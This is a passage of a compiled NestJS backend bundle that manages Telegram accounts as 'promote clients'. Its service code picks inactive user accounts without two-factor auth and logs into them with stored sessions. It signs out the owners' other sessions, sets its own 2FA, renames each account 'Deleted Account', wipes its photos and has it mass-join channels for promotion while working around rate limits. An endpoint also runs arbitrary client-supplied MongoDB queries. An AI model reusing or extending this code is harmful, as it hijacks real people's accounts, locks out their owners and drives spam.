], PromoteClientController.prototype, "addNewUserstoPromoteClients", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)('SetAsPromoteClient/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Set as Promote Client' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'User mobile number', type: String }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "setAsPromoteClient", null);
__decorate([
    (0, common_1.Get)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_promote_client_dto_1.UpdatePromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "update", null);
__decorate([
    (0, common_1.Put)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_promote_client_dto_1.UpdatePromoteClientDto]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "createdOrupdate", null);
__decorate([
    (0, common_1.Delete)(':mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete user data by ID' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "remove", null);
__decorate([
    (0, common_1.Post)('query'),
    (0, swagger_1.ApiOperation)({ summary: 'Execute a custom MongoDB query' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], PromoteClientController.prototype, "executeQuery", null);
exports.PromoteClientController = PromoteClientController = __decorate([
    (0, swagger_1.ApiTags)('Promote Clients'),
    (0, common_1.Controller)('promoteclients'),
    __metadata("design:paramtypes", [promote_client_service_1.PromoteClientService])
], PromoteClientController);


/***/ }),

/***/ "./src/components/promote-clients/promote-client.module.ts":
/*!*****************************************************************!*\
  !*** ./src/components/promote-clients/promote-client.module.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const promote_client_service_1 = __webpack_require__(/*! ./promote-client.service */ "./src/components/promote-clients/promote-client.service.ts");
const promote_client_controller_1 = __webpack_require__(/*! ./promote-client.controller */ "./src/components/promote-clients/promote-client.controller.ts");
const promote_client_schema_1 = __webpack_require__(/*! ./schemas/promote-client.schema */ "./src/components/promote-clients/schemas/promote-client.schema.ts");
const Telegram_module_1 = __webpack_require__(/*! ../Telegram/Telegram.module */ "./src/components/Telegram/Telegram.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ../active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const channels_module_1 = __webpack_require__(/*! ../channels/channels.module */ "./src/components/channels/channels.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
let PromoteClientModule = class PromoteClientModule {
};
exports.PromoteClientModule = PromoteClientModule;
exports.PromoteClientModule = PromoteClientModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.initModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'promoteClientModule', schema: promote_client_schema_1.PromoteClientSchema, collection: 'promoteClients' }]),
            (0, common_1.forwardRef)(() => Telegram_module_1.TelegramModule),
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            (0, common_1.forwardRef)(() => active_channels_module_1.ActiveChannelsModule),
            (0, common_1.forwardRef)(() => client_module_1.ClientModule),
            (0, common_1.forwardRef)(() => channels_module_1.ChannelsModule),
            (0, common_1.forwardRef)(() => buffer_client_module_1.BufferClientModule),
        ],
        controllers: [promote_client_controller_1.PromoteClientController],
        providers: [promote_client_service_1.PromoteClientService],
        exports: [promote_client_service_1.PromoteClientService]
    })
], PromoteClientModule);


/***/ }),

/***/ "./src/components/promote-clients/promote-client.service.ts":
/*!******************************************************************!*\
  !*** ./src/components/promote-clients/promote-client.service.ts ***!
  \******************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientService = void 0;
const channels_service_1 = __webpack_require__(/*! ../channels/channels.service */ "./src/components/channels/channels.service.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const Telegram_service_1 = __webpack_require__(/*! ../Telegram/Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const active_channels_service_1 = __webpack_require__(/*! ../active-channels/active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils.ts");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
const buffer_client_service_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts");
let PromoteClientService = class PromoteClientService {
    constructor(promoteClientModel, telegramService, usersService, activeChannelsService, clientService, channelsService, bufferClientService) {
        this.promoteClientModel = promoteClientModel;
        this.telegramService = telegramService;
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.clientService = clientService;
        this.channelsService = channelsService;
        this.bufferClientService = bufferClientService;
        this.joinChannelMap = new Map();
    }
    async create(promoteClient) {
        const newUser = new this.promoteClientModel(promoteClient);
        return newUser.save();
    }
    async findAll() {
        return this.promoteClientModel.find().exec();
    }
    async findOne(mobile, throwErr = true) {
        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (!user && throwErr) {
            throw new common_1.NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
        return user;
    }
    async update(mobile, updateClientDto) {
        const updatedUser = await this.promoteClientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true, returnDocument: 'after' }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`User with mobile ${mobile} not found`);
        }
        return updatedUser;
    }
    async createOrUpdate(mobile, createOrUpdateUserDto) {
        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();
        if (existingUser) {
            console.log("Updating");
            return this.update(existingUser.mobile, createOrUpdateUserDto);
        }
        else {
            console.log("creating");
            return this.create(createOrUpdateUserDto);
        }
    }
    async remove(mobile) {
        await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);
        const result = await this.promoteClientModel.deleteOne({ mobile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`PromoteClient with mobile ${mobile} not found`);
        }
    }
    async search(filter) {
        console.log(filter);
        if (filter.firstName) {
            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };
        }
        console.log(filter);
        return this.promoteClientModel.find(filter).exec();
    }
    async executeQuery(query, sort, limit, skip) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.promoteClientModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            if (skip) {
                queryExec.skip(skip);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    removeFromPromoteMap(key) {
        this.joinChannelMap.delete(key);
    }
    clearPromoteMap() {
        console.log("PromoteMap cleared");
        this.joinChannelMap.clear();
    }
    async joinchannelForPromoteClients(skipExisting = true) {
        if (!this.telegramService.getActiveClientSetup()) {
            console.log("Joining Channel Started");
            this.clearJoinChannelInterval();
            try {
                const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());
                await this.telegramService.disconnectAll();
                await (0, Helpers_1.sleep)(2000);
                const clients = await this.promoteClientModel.find({ channels: { "$lt": 250 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);
                if (clients.length > 0) {
                    for (const document of clients) {
                        try {
                            const client = await this.telegramService.createClient(document.mobile, false, false);
                            console.log("Started Joining for : ", document.mobile);
                            const channels = await client.channelInfo(true);
                            console.log("Existing Channels Length : ", channels.ids.length);
                            await this.update(document.mobile, { channels: channels.ids.length });
                            let result = [];
                            if (channels.canSendFalseCount < 50) {
                                if (channels.ids.length < 220) {
                                    result = await this.channelsService.getActiveChannels(150, 0, channels.ids);
                                }
                                else {
                                    result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);
                                }
                                this.joinChannelMap.set(document.mobile, result);
                            }
                            else {
                                await client.leaveChannels(channels.canSendFalseChats);
                            }
                            await this.telegramService.deleteClient(document.mobile);
                        }
                        catch (error) {
                            const parsedError = (0, utils_1.parseError)(error);
                            console.error(`Error while joining channels for mobile: ${document.mobile}`, parsedError);
                        }
                    }
                    this.joinChannelQueue();
                }
                console.log("Joining Channel Triggered Successfully for", clients.length);
                return `Initiated Joining channels for ${clients.length}`;
            }
            catch (error) {
                console.error("Error during the joinchannelForPromoteClients process: ", error);
                throw new Error("Failed to initiate channel joining process");
            }
        }
        else {
            console.log("Ignored active check for promote channels as an active client setup exists");
            return "Active client setup exists, skipping promotion";
        }
    }
    async joinChannelQueue() {
        const existingkeys = Array.from(this.joinChannelMap.keys());
        if (existingkeys.length > 0) {
            this.joinChannelIntervalId = setInterval(async () => {
                const keys = Array.from(this.joinChannelMap.keys());
                if (keys.length > 0) {
                    console.log("In JOIN CHANNEL interval: ", new Date().toISOString());
                    for (const mobile of keys) {
                        const channels = this.joinChannelMap.get(mobile);
                        if (channels && channels.length > 0) {
                            const channel = channels.shift();
                            console.log(mobile, " Pending Channels: ", channels.length);
                            this.joinChannelMap.set(mobile, channels);
                            try {
                                await this.telegramService.createClient(mobile, false, false);
                                console.log(mobile, " Trying to join: ", channel.username);
                                await this.telegramService.tryJoiningChannel(mobile, channel);
                            }
                            catch (error) {
                                const errorDetails = (0, utils_1.parseError)(error, `${mobile} @${channel.username} Outer Err ERR: `);
                                console.error(`${mobile} Error while joining @${channel.username}`, errorDetails);
                                if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {
                                    console.log(`${mobile} has FloodWaitError or joined too many channels. Handling...`);
                                    this.removeFromPromoteMap(mobile);
                                    const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);
                                }
                            }
                            finally {
                                await this.telegramService.deleteClient(mobile);
                            }
                        }
                        else {
                            this.joinChannelMap.delete(mobile);
                        }
                    }
                }
                else {
                    this.clearJoinChannelInterval();
                }
            }, 4 * 60 * 1000);
        }
    }
    clearJoinChannelInterval() {
        if (this.joinChannelIntervalId) {
            clearInterval(this.joinChannelIntervalId);
            this.joinChannelIntervalId = null;
            setTimeout(() => {
                this.joinchannelForPromoteClients(false);
            }, 30000);
        }
    }
    async setAsPromoteClient(mobile, availableDate = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]) {
        const user = (await this.usersService.search({ mobile, expired: false }))[0];
        if (!user) {
            throw new common_1.BadRequestException('user not found');
        }
        const isExist = await this.findOne(mobile, false);
        if (isExist) {
            throw new common_1.ConflictException('PromoteClient already exist');
        }
        const clients = await this.clientService.findAll();
        const clientMobiles = clients.map(client => client?.mobile);
        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);
        if (!clientMobiles.includes(mobile) && !clientPromoteMobiles.includes(mobile)) {
            const telegramClient = await this.telegramService.createClient(mobile, false);
            try {
                await telegramClient.set2fa();
                await (0, Helpers_1.sleep)(15000);
                await telegramClient.updateUsername('');
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updatePrivacyforDeletedAccount();
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.updateProfile("Deleted Account", "Deleted Account");
                await (0, Helpers_1.sleep)(3000);
                await telegramClient.deleteProfilePhotos();
                const channels = await this.telegramService.getChannelInfo(mobile, true);
                const promoteClient = {
                    tgId: user.tgId,
                    lastActive: "default",
                    mobile: user.mobile,
                    availableDate,
                    channels: channels.ids.length,
                };
                await this.promoteClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: promoteClient }, { new: true, upsert: true }).exec();
            }
            catch (error) {
                const errorDetails = (0, utils_1.parseError)(error);
                throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
            }
            await this.telegramService.deleteClient(mobile);
            return "Client set as promote successfully";
        }
        else {
            throw new common_1.BadRequestException("Number is a Active Client");
        }
    }
    async checkPromoteClients() {
        if (!this.telegramService.getActiveClientSetup()) {
            await this.telegramService.disconnectAll();
            await (0, Helpers_1.sleep)(2000);
            const promoteclients = await this.findAll();
            let goodIds = [];
            let badIds = [];
            if (promoteclients.length < 80) {
                for (let i = 0; i < 80 - promoteclients.length && badIds.length < 4; i++) {
                    badIds.push(i.toString());
                }
            }
            const clients = await this.clientService.findAll();
            const bufferClients = await this.bufferClientService.findAll();
            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile); })];
            const bufferClientIds = bufferClients.map(client => client.mobile);
            const today = (new Date(Date.now())).toISOString().split('T')[0];
            for (const document of promoteclients) {
                if (!clientIds.includes(document.mobile) && !bufferClientIds.includes(document.mobile)) {
                    try {
                        const cli = await this.telegramService.createClient(document.mobile, true, false);
                        const me = await cli.getMe();
                        if (me.username) {
                            await this.telegramService.updateUsername(document.mobile, '');
                            await (0, Helpers_1.sleep)(2000);
                        }
                        if (me.firstName !== "Deleted Account") {
                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');
                            await (0, Helpers_1.sleep)(2000);
                        }
                        await this.telegramService.deleteProfilePhotos(document.mobile);
                        const hasPassword = await cli.hasPassword();
                        if (!hasPassword && badIds.length < 4) {
                            console.log("Client does not have password");
                            badIds.push(document.mobile);
                        }
                        else {
                            console.log(document.mobile, " :  ALL Good");
                            goodIds.push(document.mobile);
                        }
                        await this.telegramService.removeOtherAuths(document.mobile);
                        await (0, Helpers_1.sleep)(2000);
                        await this.telegramService.deleteClient(document.mobile);
                    }
                    catch (error) {
                        (0, utils_1.parseError)(error);
                        badIds.push(document.mobile);
                        this.remove(document.mobile);
                        await this.telegramService.deleteClient(document.mobile);
                    }
                }
                else {
                    console.log("Number is a Active Client");
                    goodIds.push(document.mobile);
                    this.remove(document.mobile);
                }
            }
            goodIds = [...goodIds, ...clientIds, ...bufferClientIds];
            console.log("GoodIds: ", goodIds.length, "BadIds : ", badIds.length);
            this.addNewUserstoPromoteClients(badIds, goodIds);
        }
        else {
            console.log("ignored active check promote channels as active client setup exists");
        }
    }
    async addNewUserstoPromoteClients(badIds, goodIds) {
        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
        const documents = await this.usersService.executeQuery({ "mobile": { $nin: goodIds }, twoFA: false, expired: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);
        console.log("New promote documents to be added: ", documents.length);
        while (badIds.length > 0 && documents.length > 0) {
            const document = documents.shift();
            try {
                try {
                    const client = await this.telegramService.createClient(document.mobile, false);
                    const hasPassword = await client.hasPassword();
                    console.log("hasPassword: ", hasPassword);
                    if (!hasPassword) {
                        await client.removeOtherAuths();
                        await client.set2fa();
                        console.log("waiting for setting 2FA");
                        await (0, Helpers_1.sleep)(30000);
                        await client.updateUsername('');
                        await (0, Helpers_1.sleep)(3000);
                        await client.updatePrivacyforDeletedAccount();
                        await (0, Helpers_1.sleep)(3000);
                        await client.updateProfile("Deleted Account", "Deleted Account");
                        await (0, Helpers_1.sleep)(3000);
                        await client.deleteProfilePhotos();
                        const channels = await client.channelInfo(true);
                        console.log("Inserting Document");
                        const promoteClient = {
                            tgId: document.tgId,
                            lastActive: "today",
                            mobile: document.mobile,
                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],
                            channels: channels.ids.length,
                        };
                        await this.create(promoteClient);
                        await this.usersService.update(document.tgId, { twoFA: true });
                        console.log("=============Created PromoteClient=============");
                        await this.telegramService.deleteClient(document.mobile);
                        badIds.pop();
                    }
                    else {
                        console.log("Failed to Update as PromoteClient has Password");
                        await this.usersService.update(document.tgId, { twoFA: true });
                        await this.telegramService.deleteClient(document.mobile);
                    }
                }
                catch (error) {
                    (0, utils_1.parseError)(error);
                    await this.telegramService.deleteClient(document.mobile);
                }
            }
            catch (error) {
                (0, utils_1.parseError)(error);
                console.error("An error occurred:", error);
            }
            await this.telegramService.deleteClient(document.mobile);
        }
        setTimeout(() => {
            this.joinchannelForPromoteClients();
        }, 2 * 60 * 1000);
    }
};
exports.PromoteClientService = PromoteClientService;
exports.PromoteClientService = PromoteClientService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('promoteClientModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __param(5, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(6, (0, common_1.Inject)((0, common_1.forwardRef)(() => buffer_client_service_1.BufferClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        client_service_1.ClientService,
        channels_service_1.ChannelsService,
        buffer_client_service_1.BufferClientService])
], PromoteClientService);


/***/ }),

/***/ "./src/components/promote-clients/schemas/promote-client.schema.ts":
/*!*************************************************************************!*\
  !*** ./src/components/promote-clients/schemas/promote-client.schema.ts ***!
  \*************************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteClientSchema = exports.PromoteClient = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
let PromoteClient = class PromoteClient {
};
exports.PromoteClient = PromoteClient;
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "tgId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "mobile", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "lastActive", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], PromoteClient.prototype, "availableDate", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, type: Number }),
    __metadata("design:type", Number)
], PromoteClient.prototype, "channels", void 0);
exports.PromoteClient = PromoteClient = __decorate([
    (0, mongoose_1.Schema)({ collection: 'promoteClients', versionKey: false, autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], PromoteClient);
exports.PromoteClientSchema = mongoose_1.SchemaFactory.createForClass(PromoteClient);


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.controller.ts":
/*!****************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.controller.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgsController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const promote_msgs_service_1 = __webpack_require__(/*! ./promote-msgs.service */ "./src/components/promote-msgs/promote-msgs.service.ts");
let PromoteMsgsController = class PromoteMsgsController {
    constructor(promoteMsgsService) {
        this.promoteMsgsService = promoteMsgsService;
    }
    async findOne() {
        return this.promoteMsgsService.findOne();
    }
    async update(updateClientDto) {
        return this.promoteMsgsService.update(updateClientDto);
    }
};
exports.PromoteMsgsController = PromoteMsgsController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get promote-msgs data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteMsgsController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update promote-msgs' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], PromoteMsgsController.prototype, "update", null);
exports.PromoteMsgsController = PromoteMsgsController = __decorate([
    (0, swagger_1.ApiTags)('Promote-msgs'),
    (0, common_1.Controller)('promote-msgs'),
    __metadata("design:paramtypes", [promote_msgs_service_1.PromoteMsgsService])
], PromoteMsgsController);


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.module.ts":
/*!************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.module.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const promote_msgs_service_1 = __webpack_require__(/*! ./promote-msgs.service */ "./src/components/promote-msgs/promote-msgs.service.ts");
const promote_msgs_controller_1 = __webpack_require__(/*! ./promote-msgs.controller */ "./src/components/promote-msgs/promote-msgs.controller.ts");
const promote_msgs_schema_1 = __webpack_require__(/*! ./promote-msgs.schema */ "./src/components/promote-msgs/promote-msgs.schema.ts");
let PromoteMsgModule = class PromoteMsgModule {
};
exports.PromoteMsgModule = PromoteMsgModule;
exports.PromoteMsgModule = PromoteMsgModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            PromoteMsgModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: promote_msgs_schema_1.PromoteMsgSchema }]),
        ],
        providers: [promote_msgs_service_1.PromoteMsgsService],
        controllers: [promote_msgs_controller_1.PromoteMsgsController],
        exports: [promote_msgs_service_1.PromoteMsgsService],
    })
], PromoteMsgModule);


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.schema.ts":
/*!************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.schema.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteMsgSchema = exports.PromoteMsg = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let PromoteMsg = class PromoteMsg {
};
exports.PromoteMsg = PromoteMsg;
exports.PromoteMsg = PromoteMsg = __decorate([
    (0, mongoose_1.Schema)({ versionKey: false, autoIndex: true, strict: false, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        }, })
], PromoteMsg);
exports.PromoteMsgSchema = mongoose_1.SchemaFactory.createForClass(PromoteMsg);
exports.PromoteMsgSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/promote-msgs/promote-msgs.service.ts":
/*!*************************************************************!*\
  !*** ./src/components/promote-msgs/promote-msgs.service.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
